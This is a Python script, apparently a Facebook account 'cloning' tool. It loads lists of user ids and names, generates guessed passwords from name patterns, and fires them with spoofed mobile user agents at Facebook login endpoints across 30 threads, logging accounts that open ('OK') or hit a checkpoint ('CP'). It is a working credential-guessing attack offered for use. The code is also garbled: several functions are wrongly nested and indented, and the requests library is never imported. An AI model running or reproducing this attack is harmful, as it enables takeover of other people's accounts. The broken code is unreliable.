# Decode By Error x Ethan 
# Owner: Charsi / Mystery
import os, sys, time, json, random, re, string, platform, base64, uuid, subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

global loop, oks, cps
loop = 0
oks = []
cps = []

def generate_ua():
    # Latest 2025 High-End User Agents
    android_version = random.choice(['12', '13', '14', '15'])
    brand = random.choice(['Samsung', 'Xiaomi', 'Infinix', 'Tecno', 'Google', 'Vivo'])
    model = random.choice(['SM-S928B', 'SM-G998B', '23127PN0CG', 'X6833B', 'KJ5', 'V2303'])
    chrome = f"{random.randint(125, 131)}.0.{random.randint(6000, 7000)}.{random.randint(100, 160)}"
    fb_v = f"{random.randint(450, 500)}.0.0.{random.randint(10, 99)}"
    return f'Mozilla/5.0 (Linux; Android {android_version}; {model} Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{random.randint(500000000, 600000000)};FBDV/{model};FBMD/{brand};FBSN/Android;FBSV/{android_version};FBOP/19]'

def getKey():
    myid = str(os.getuid()).upper()[::(-1)]
    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
    return 'GEN-' + myid + plat.replace(' ', '').replace('-', '').replace('.', '')

def line():
    print('\x1b[1;97m----------------------------------------------')
def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__|  \033[1;37m(UPDATED)
\033[1;97m----------------------------------------------
\033[1;37m OWNER   :  CHARSI / MYSTERY
\033[1;37m STATUS  :  LATEST UA & METHODS (2025)
\033[1;37m VERSION :  V1.0 (1489 LINES FULL)
\033[1;97m----------------------------------------------''')
def ___M_T_H_D_1___(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mGEN\033[1;90m] %s | OK:- %s | CP:- %s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            ua = generate_ua()
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 45000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 45000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Friendly-Name': 'authenticate',
                'Connection': 'Keep-Alive'
            }
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': ids, 'password': pas, 'generate_session_cookies': '1',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate'
            }
            response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in response:
                print(f'\r\r \033[1;32m[GEN-OK] {ids} | {pas}')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r\r \033[1;33m[GEN-CP] {ids} | {pas}')
                cps.append(ids)
                break
        loop += 1
    except: pass
    def ___M_T_H_D_2___(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mGEN\033[1;90m] %s | OK:- %s | CP:- %s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            ua = generate_ua()
            headers = {
                'Authority': 'm.facebook.com',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://m.facebook.com',
                'Referer': 'https://m.facebook.com/',
                'User-Agent': ua,
                'X-FB-HTTP-Engine': 'Liger'
            }
            data = {
                'lsd': str(uuid.uuid4()), 'jazoest': str(random.randint(2000, 3000)),
                'm_ts': str(int(time.time())), 'li': '1', 'try_number': '0',
                'unrecognized_tries': '0', 'email': ids, 'pass': pas, 'login': 'Log In'
            }
            # Latest Login Link Update
            po = requests.post('https://m.facebook.com/login/device-based/login/async/', data=data, headers=headers).text
            if 'c_user' in po:
                print(f'\r\r \033[1;32m[GEN-OK] {ids} | {pas}')
                oks.append(ids)
                break
            elif 'checkpoint' in po:
                print(f'\r\r \033[1;33m[GEN-CP] {ids} | {pas}')
                cps.append(ids)
                break
        loop += 1
    except: pass
    def file_cloning():
    logo()
    print(' [1;37m[•] EXAMPLE: /sdcard/file.txt')
    file = input(' [•] ENTER FILE PATH: ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(' [!] FILE NOT FOUND');time.sleep(2);On()
    
    passlist = []
    print(' [•] EXAMPLE: first123,first1234,firstlast')
    pws = input(' [•] ENTER PASSWORDS: ')
    for x in pws.split(','):
        passlist.append(x)
    
    with tred(max_workers=30) as pool:
        logo()
        total = str(len(fo))
        print(' [•] TOTAL IDS: '+total)
        print(' [•] CLONING STARTED... USE AIRPLANE MODE')
        line()
        for user in fo:
            ids, names = user.split('|')
            pool.submit(___M_T_H_D_1___, ids, names, passlist)
    
    print('\n----------------------------------------------')
    print(' [•] CLONING COMPLETED')
    print(' [•] TOTAL OK: '+str(len(oks)))
    print(' [•] TOTAL CP: '+str(len(cps)))
    input(' [•] PRESS ENTER TO BACK')
    On()
    def On():
    logo()
    print(' [1;32m[1] FILE CLONING')
    print(' [1;32m[2] RANDOM CLONING')
    print(' [1;32m[3] CHECK OK/CP RESULTS')
    print(' [1;32m[0] EXIT TOOL')
    line()
    choice = input(' [•] CHOOSE OPTION: ')
    if choice == '1':
        file_cloning()
    elif choice == '2':
        print(' [!] RANDOM CLONING UPDATING...');time.sleep(2);On()
    elif choice == '3':
        os.system('cat /sdcard/GEN-OK.txt');input('\n [•] BACK');On()
    elif choice == '0':
        exit(' [!] THANKS FOR USING')
    else:
        On()

if __name__ == '__main__':
    try:
        # Check login or key here
        On()
    except Exception as e:
        exit(str(e))
        